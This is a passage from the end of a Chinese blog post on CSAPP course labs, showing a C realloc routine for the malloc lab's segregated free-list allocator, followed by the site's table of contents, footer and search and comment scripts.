class="keyword">else</span>&#123; <span class="comment">//否则，形成内部碎片</span></span><br><span class="line">        PUT(HDRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="realloc-2"><a href="#realloc-2" class="headerlink" title="realloc"></a>realloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line">    <span class="keyword">size_t</span> asize;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) &#123;</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size &lt;= DSIZE)&#123;</span><br><span class="line">        asize = <span class="number">2</span>*(DSIZE);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        asize = (DSIZE)*((size+(DSIZE)+(DSIZE<span class="number">-1</span>)) / (DSIZE));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(oldsize == asize) <span class="keyword">return</span> ptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//否则，申请新的，拷贝，然后释放掉旧的</span></span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="comment">/* If realloc() fails the original block is left untouched  */</span></span><br><span class="line">    <span class="keyword">if</span>(!newptr) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Copy the old data. */</span></span><br><span class="line">    oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span>(size &lt; oldsize) oldsize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free the old block. */</span></span><br><span class="line">    mm_free(ptr);</span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div></div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>投币</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.png" alt="Stardust567 微信">
        <p>微信</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="Stardust567 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    Stardust567
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://stardust567.github.io/post/9f31.html" title="ICS lab">https://stardust567.github.io/post/9f31.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议，转载请务必署名，欢迎邮件私我讨论交流。
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/大四/" rel="tag"><i class="fa fa-tag"></i> 大四</a>
          
            <a href="/tags/CSAPP/" rel="tag"><i class="fa fa-tag"></i> CSAPP</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/post/a9cc.html" rel="next" title="Local Cache">
                <i class="fa fa-chevron-left"></i> Local Cache
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/post/44c3.html" rel="prev" title="ChCore lab">
                ChCore lab <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Stardust567</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">43</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">55</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bomb"><span class="nav-number">1.</span> <span class="nav-text">Bomb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解决思路"><span class="nav-number">1.1.</span> <span class="nav-text">解决思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb常用命令"><span class="nav-number">1.1.1.</span> <span class="nav-text">gdb常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-64寄存器"><span class="nav-number">1.1.2.</span> <span class="nav-text">x86-64寄存器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决流程"><span class="nav-number">1.2.</span> <span class="nav-text">解决流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">phase_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-2"><span class="nav-number">1.2.2.</span> <span class="nav-text">phase_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-3"><span class="nav-number">1.2.3.</span> <span class="nav-text">phase_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-4"><span class="nav-number">1.2.4.</span> <span class="nav-text">phase_4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-5"><span class="nav-number">1.2.5.</span> <span class="nav-text">phase_5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-6"><span class="nav-number">1.2.6.</span> <span class="nav-text">phase_6</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Attack"><span class="nav-number">2.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-Injection-Attacks"><span class="nav-number">2.1.</span> <span class="nav-text">Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-1-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">phase_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-2-1"><span class="nav-number">2.1.2.</span> <span class="nav-text">phase_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-3-1"><span class="nav-number">2.1.3.</span> <span class="nav-text">phase_3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Return-Oriented-Programming"><span class="nav-number">2.2.</span> <span class="nav-text">Return Oriented Programming</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-4-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">phase_4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-5-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">phase_5</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell"><span class="nav-number">3.</span> <span class="nav-text">Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">3.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信号"><span class="nav-number">3.1.1.</span> <span class="nav-text">信号</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#步骤流程"><span class="nav-number">3.2.</span> <span class="nav-text">步骤流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#01"><span class="nav-number">3.2.1.</span> <span class="nav-text">01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02"><span class="nav-number">3.2.2.</span> <span class="nav-text">02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#05"><span class="nav-number">3.2.3.</span> <span class="nav-text">05</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#06"><span class="nav-number">3.2.4.</span> <span class="nav-text">06</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#08"><span class="nav-number">3.2.5.</span> <span class="nav-text">08</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#09"><span class="nav-number">3.2.6.</span> <span class="nav-text">09</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Malloc"><span class="nav-number">4.</span> <span class="nav-text">Malloc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识-1"><span class="nav-number">4.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#三种适配方式："><span class="nav-number">4.1.1.</span> <span class="nav-text">三种适配方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四种空闲列表的组织方式"><span class="nav-number">4.1.2.</span> <span class="nav-text">四种空闲列表的组织方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#两种合并的方式"><span class="nav-number">4.1.3.</span> <span class="nav-text">两种合并的方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#带边界标记的合并"><span class="nav-number">4.1.4.</span> <span class="nav-text">带边界标记的合并</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#两种内存碎片"><span class="nav-number">4.1.5.</span> <span class="nav-text">两种内存碎片</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验开始之前"><span class="nav-number">4.2.</span> <span class="nav-text">实验开始之前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐式空闲链表"><span class="nav-number">4.3.</span> <span class="nav-text">隐式空闲链表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-number">4.3.1.</span> <span class="nav-text">init</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-number">4.3.2.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc"><span class="nav-number">4.3.3.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#realloc"><span class="nav-number">4.3.4.</span> <span class="nav-text">realloc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#显示空闲链表"><span class="nav-number">4.4.</span> <span class="nav-text">显示空闲链表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#init-1"><span class="nav-number">4.4.1.</span> <span class="nav-text">init</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-1"><span class="nav-number">4.4.2.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-1"><span class="nav-number">4.4.3.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#realloc-1"><span class="nav-number">4.4.4.</span> <span class="nav-text">realloc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分离空闲链表"><span class="nav-number">4.5.</span> <span class="nav-text">分离空闲链表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#init-2"><span class="nav-number">4.5.1.</span> <span class="nav-text">init</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-2"><span class="nav-number">4.5.2.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-2"><span class="nav-number">4.5.3.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#realloc-2"><span class="nav-number">4.5.4.</span> <span class="nav-text">realloc</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Stardust567</span>

  
</div>










        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'JYnD0OKLKim6sRc0a0s3J4kK-gzGzoHsz',
        appKey: 'HmTcztUucDEpy2MxiXT1AkXF',
        placeholder: '谢谢你认真看到了最后，这里欢迎各种吐槽与交流：',
        avatar:'monsterid',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("JYnD0OKLKim6sRc0a0s3J4kK-gzGzoHsz", "HmTcztUucDEpy2MxiXT1AkXF");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->


  
  

  
  


  

  

</body>
</html>
